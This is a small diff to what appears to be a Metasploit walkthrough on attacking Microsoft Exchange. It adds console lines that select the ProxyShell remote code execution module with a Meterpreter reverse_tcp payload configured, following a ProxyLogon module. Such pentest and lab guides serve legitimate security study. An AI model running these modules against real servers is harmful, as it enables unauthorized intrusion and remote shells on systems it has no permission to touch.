@@ -319,6 +319,11 @@ msf6> search exchange
 
 ![image](https://github.com/user-attachments/assets/c2c82ba6-24e5-4944-a52a-70398804abb2)
 
+<pre><code>msf6 exploit(windows/http/exchange_proxylogon_rce) > use windows/http/exchange_proxyshell_rce
+[*] Using configured payload windows/x64/meterpreter/reverse_tcp
+msf6 exploit(windows/http/exchange_proxyshell_rce) > show options</code></pre>
+
+<br>
 
 
 
